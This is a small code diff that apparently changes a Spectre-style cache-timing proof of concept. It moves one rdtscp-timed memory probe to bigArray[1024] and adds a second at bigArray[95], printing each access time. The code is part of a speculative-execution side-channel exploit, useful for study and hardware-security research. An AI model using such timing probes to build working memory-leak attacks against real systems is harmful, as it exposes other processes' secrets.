@@ -73,13 +73,19 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     victim_function(); //store in big[0]
 
    
-    addr = & bigArray[1];
+    addr = & bigArray[1024];
     time1 = __rdtscp( & junk); /* READ TIMER */
     junk = * addr; /* MEMORY ACCESS TO TIME */
     time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+    printf("Time to get 1024 is:");
     printf("%" PRId64 "\n", time2);
 
-
+    addr = &bigArray[95];
+    time1 = __rdtscp(&junk); /* READ TIMER */
+    junk = *addr; /* MEMORY ACCESS TO TIME */
+    time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+    printf("Time to get 95 is:");
+    printf("%" PRId64 "\n", time2);
 
   }
   results[0] ^= junk; /* use junk so code above won't get optimized out */
